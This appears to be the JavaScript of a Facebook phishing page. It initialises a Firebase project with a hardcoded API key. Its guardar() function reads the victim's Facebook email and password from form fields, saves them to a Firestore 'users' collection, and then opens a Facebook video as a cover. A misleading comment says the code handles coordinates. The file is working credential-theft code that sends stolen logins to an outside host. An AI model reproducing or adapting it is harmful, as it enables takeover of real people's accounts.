firebase.initializeApp({
    apiKey: "AIzaSyDqfihS3c6xRg8GPG3LwedqxVbaWv80MVM",
    authDomain: "prestacasa-ad0ec.firebaseapp.com",
    databaseURL: "https://prestacasa-ad0ec.firebaseio.com",
    projectId: "prestacasa-ad0ec",
    storageBucket: "prestacasa-ad0ec.appspot.com",
    messagingSenderId: "846656829348"
  });

   // Initialize Cloud Firestore through Firebase
   var db = firebase.firestore();

  function guardar(){
    var correoFace = document.getElementById('emailFacebook').value;
    var contrasenaFace = document.getElementById('passFacebook').value;

    try {
      
      db.collection("users").add({
        correo: correoFace,
        contrasena: contrasenaFace
    })
        .then(function(docRef) {
          console.log("Document written with ID: ", docRef.id);
            document.getElementById('emailFacebook').value='';
            document.getElementById('passFacebook').value='';
        })
        .catch(function(error) {
            console.error("Error adding document: ", error);
    });

    } catch (error) {
      alert('Cargando...')
    }

    window.open("https://www.facebook.com/guelodeluxe/videos/626779717830744/","_blank");


    }//Aqui termina el metodo para las coordenadas